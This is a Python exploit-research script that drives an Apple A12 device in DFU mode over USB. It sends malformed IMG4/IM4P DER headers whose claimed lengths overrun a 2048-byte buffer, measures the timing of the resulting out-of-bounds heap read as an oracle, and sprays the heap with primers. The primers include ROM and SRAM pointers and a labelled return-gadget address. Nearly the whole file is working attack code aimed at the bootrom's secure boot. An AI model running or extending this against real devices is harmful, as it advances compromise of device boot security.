#!/usr/bin/env python3
"""
A12 SecureROM — Heap OOB Read Timing Oracle
=============================================
CONFIRMED: DER parser reads beyond 2048B buffer when DER length claims more.
  - img4 with fitting length: ~4500us
  - img4 with OOB 4k length: ~6000us (+1500us!)
  - im4p with OOB 4k length: ~6500us

HYPOTHESIS: If we can prime the heap with controlled data BEFORE
the final DNLOAD, the parser will read our sprayed data as DER,
and timing will differ based on what it finds.

PLAN:
  Phase 1: Precision measurement of OOB timing curve
  Phase 2: Heap priming — DNLOAD+ABORT to leave data on heap, 
           then DNLOAD trigger payload → measure timing difference
  Phase 3: Systematic OOB length sweep to map readable region
"""
import time, json, struct, statistics
from datetime import datetime
from pathlib import Path

import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC; DFU_PID = 0x1227
be = lambda: usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] {msg}", flush=True)

class HeapOracle:
    def __init__(self):
        self.dev = None

    def connect(self):
        self.dev = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=be())
        if self.dev:
            try: self.dev.set_configuration()
            except: pass
            return True
        return False

    def ctrl(self, rt, req, val, idx, d, timeout=5000):
        return self.dev.ctrl_transfer(rt, req, val, idx, d, timeout=timeout)

    def status(self):
        try:
            r = self.ctrl(0xA1, 3, 0, 0, 6)
            return (r[4], r[0], r[1]|(r[2]<<8)|(r[3]<<16)) if len(r)>=6 else None
        except: return None

    def to_idle(self):
        for _ in range(20):
            s = self.status()
            if not s: time.sleep(0.1); self.connect(); continue
            if s[0] == 2: return True
            if s[0] == 10: self.ctrl(0x21, 4, 0, 0, 0)
            elif s[0] == 4: time.sleep(s[2]/1000+0.01); self.status()
            try: self.ctrl(0x21, 6, 0, 0, 0)
            except: pass
            time.sleep(0.02)
        return False

    def alive(self):
        try: return usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=be()) is not None
        except: return False

    def manifest_timing(self, payload):
        """
        Full manifest cycle. Returns timing in us or None.
        """
        if not self.to_idle(): return None

        t0 = time.perf_counter_ns()
        
        # DNLOAD data
        try: self.ctrl(0x21, 1, 0, 0, payload, timeout=5000)
        except: return None

        # GET_STATUS → state 5
        s = self.status()
        if not s or s[0] != 5: return None

        # Zero-length DNLOAD → triggers manifest
        try: self.ctrl(0x21, 1, 0, 0, b"", timeout=5000)
        except: pass

        # GET_STATUS → state 6 (MANIFEST-SYNC)
        s = self.status()
        t_manifest = time.perf_counter_ns()

        # Poll until terminal
        for _ in range(200):
            if not s or s[0] in (2, 8, 10): break
            if s[0] == 4: time.sleep(s[2]/1000)
            s = self.status()

        t_end = time.perf_counter_ns()
        return (t_end - t0) / 1000  # total us

    def dnload_abort(self, payload):
        """DNLOAD then ABORT — leaves payload data on heap (not processed)"""
        if not self.to_idle(): return False
        try:
            self.ctrl(0x21, 1, 0, 0, payload, timeout=5000)
        except: return False
        # GET_STATUS to let it process
        self.status()
        # ABORT before manifest
        try: self.ctrl(0x21, 6, 0, 0, 0)
        except: pass
        time.sleep(0.02)
        return True

    def run(self):
        log("="*60)
        log("A12 — Heap OOB Read Timing Oracle")
        log("="*60)

        if not self.connect():
            log("NO DFU DEVICE"); return

        results = {"timestamp": datetime.now().isoformat()}

        # =============================================================
        # Phase 1: Precision OOB timing curve
        # Vary the claimed DER length from exact fit to far OOB
        # =============================================================
        log("\n=== Phase 1: OOB Length vs Timing Curve ===")
        
        REPS = 5
        
        # IMG4 header: \x30\x82\xHH\xHH\x16\x04IMG4
        # Length field starts at byte 2-3 (big-endian)
        # Total overhead: 10 bytes header → content starts at byte 10
        # For 2048B payload, content = 2038 bytes
        # Fitting length = 2038 = 0x07F6
        
        oob_curve = []
        test_lengths = [
            2038,   # exact fit
            2048,   # +10 OOB
            2100,   # +62 OOB
            2200,   # +162 OOB
            2500,   # +462 OOB
            3000,   # +962 OOB
            4090,   # +2052 OOB (2x buffer)
            8186,   # +6148 OOB (4x buffer)
            16378,  # +14340 OOB (8x buffer)
            32762,  # +30724 OOB (16x buffer)
            65530,  # +63492 OOB (32x buffer)
        ]
        
        for claimed_len in test_lengths:
            # Build IMG4: SEQUENCE(claimed_len) + IA5String "IMG4" + zeros
            hdr = b"\x30\x82" + struct.pack(">H", claimed_len) + b"\x16\x04IMG4"
            payload = hdr + bytes(2048 - len(hdr))
            
            times = []
            for _ in range(REPS):
                t = self.manifest_timing(payload)
                if t: times.append(t)
            
            oob_bytes = claimed_len - 2038
            med = statistics.median(times) if times else 0
            mn = min(times) if times else 0
            mx = max(times) if times else 0
            
            oob_curve.append({
                "claimed_len": claimed_len,
                "oob_bytes": oob_bytes,
                "median_us": round(med, 0),
                "min_us": round(mn, 0),
                "max_us": round(mx, 0),
                "raw": [round(t, 0) for t in times],
            })
            
            log(f"  claim={claimed_len:6d} oob={oob_bytes:+6d}B: "
                f"median={med:>8.0f}us [{mn:.0f}-{mx:.0f}]")
        
        results["oob_curve"] = oob_curve

        # =============================================================
        # Phase 2: Heap Priming — does prior DNLOAD content affect timing?
        # =============================================================
        log("\n=== Phase 2: Heap Priming Effect ===")
        log("  Strategy: DNLOAD(primer)+ABORT, then DNLOAD(trigger)+MANIFEST")
        
        # Trigger: IMG4 with OOB length=4090 → parser reads 2052 bytes OOB
        trigger_hdr = b"\x30\x82\x0F\xFA\x16\x04IMG4"
        trigger = trigger_hdr + bytes(2048 - len(trigger_hdr))
        
        heap_tests = []
        
        # Baseline: no priming
        log("  [Baseline: no priming]")
        base_times = []
        for _ in range(REPS):
            t = self.manifest_timing(trigger)
            if t: base_times.append(t)
        
        base_med = statistics.median(base_times) if base_times else 0
        heap_tests.append({
            "name": "no_priming",
            "median_us": round(base_med),
            "raw": [round(t) for t in base_times],
        })
        log(f"    median={base_med:.0f}us")
        
        # With different primers
        primers = [
            ("zeros_2048",      bytes(2048)),
            ("0xFF_2048",       b"\xFF" * 2048),
            ("0x30_seq_tags",   b"\x30" * 2048),  # all SEQUENCE tags
            ("nested_seq",      (b"\x30\x82\x00\x04") * 512),  # many small sequences
            ("img4_header",     b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038)),
            ("sram_ptrs",       struct.pack("<Q", 0x19C018000) * 256),
            ("rom_ptrs",        struct.pack("<Q", 0x100000000) * 256),
            ("ret_gadget",      struct.pack("<Q", 0x100000044) * 256),  # near ROM base
        ]
        
        for pname, primer in primers:
            times = []
            for _ in range(REPS):
                # Step 1: Prime heap
                ok = self.dnload_abort(primer)
                if not ok:
                    log(f"  [{pname}]: prime failed"); continue
                
                # Step 2: Trigger manifest with OOB payload
                t = self.manifest_timing(trigger)
                if t: times.append(t)
            
            med = statistics.median(times) if times else 0
            diff = med - base_med
            heap_tests.append({
                "name": pname,
                "median_us": round(med),
                "diff_from_base": round(diff),
                "raw": [round(t) for t in times],
            })
            
            flag = " <<<" if abs(diff) > 500 else ""
            log(f"  [{pname:18s}]: median={med:>8.0f}us diff={diff:+.0f}us{flag}")
            
            if not self.alive():
                log(f"  >>> DEVICE DIED after primer {pname}!")
                break
        
        results["heap_priming"] = heap_tests

        # =============================================================
        # Phase 3: IM4P variant (deeper parsing)
        # =============================================================
        log("\n=== Phase 3: IM4P OOB (deeper parser path) ===")
        
        # IM4P: SEQUENCE → IA5"IM4P" → IA5(component) → IA5(desc) → OCTET(data)
        im4p_trigger_hdr = (
            b"\x30\x82\x0F\xFA"   # SEQUENCE, len=4090 (OOB!)
            b"\x16\x04IM4P"        # IA5String "IM4P"
            b"\x16\x04ibss"        # IA5String "ibss"
            b"\x16\x00"            # IA5String "" (desc)
            b"\x04\x82\x0F\xE0"   # OCTET STRING, len=4064 (OOB!)
        )
        im4p_trigger = im4p_trigger_hdr + bytes(2048 - len(im4p_trigger_hdr))
        
        im4p_tests = []
        
        # Baseline
        log("  [IM4P baseline: no priming]")
        base_times = []
        for _ in range(REPS):
            t = self.manifest_timing(im4p_trigger)
            if t: base_times.append(t)
        im4p_base = statistics.median(base_times) if base_times else 0
        im4p_tests.append({"name": "no_priming", "median_us": round(im4p_base),
                           "raw": [round(t) for t in base_times]})
        log(f"    median={im4p_base:.0f}us")
        
        # Key primers
        key_primers = [
            ("zeros",       bytes(2048)),
            ("0xFF",        b"\xFF" * 2048),
            ("seq_tags",    b"\x30" * 2048),
            ("valid_img4",  b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038)),
        ]
        
        for pname, primer in key_primers:
            times = []
            for _ in range(REPS):
                self.dnload_abort(primer)
                t = self.manifest_timing(im4p_trigger)
                if t: times.append(t)
            
            med = statistics.median(times) if times else 0
            diff = med - im4p_base
            im4p_tests.append({
                "name": pname, "median_us": round(med),
                "diff": round(diff), "raw": [round(t) for t in times]
            })
            flag = " <<<" if abs(diff) > 500 else ""
            log(f"  [{pname:18s}]: median={med:>8.0f}us diff={diff:+.0f}us{flag}")
        
        results["im4p_heap"] = im4p_tests

        # Save
        outf = Path(__file__).parent / "results" / "heap_oob_oracle.json"
        outf.parent.mkdir(exist_ok=True)
        with open(outf, "w") as f:
            json.dump(results, f, indent=2)
        log(f"\nSaved: {outf}")
        log("DONE")

if __name__ == "__main__":
    HeapOracle().run()
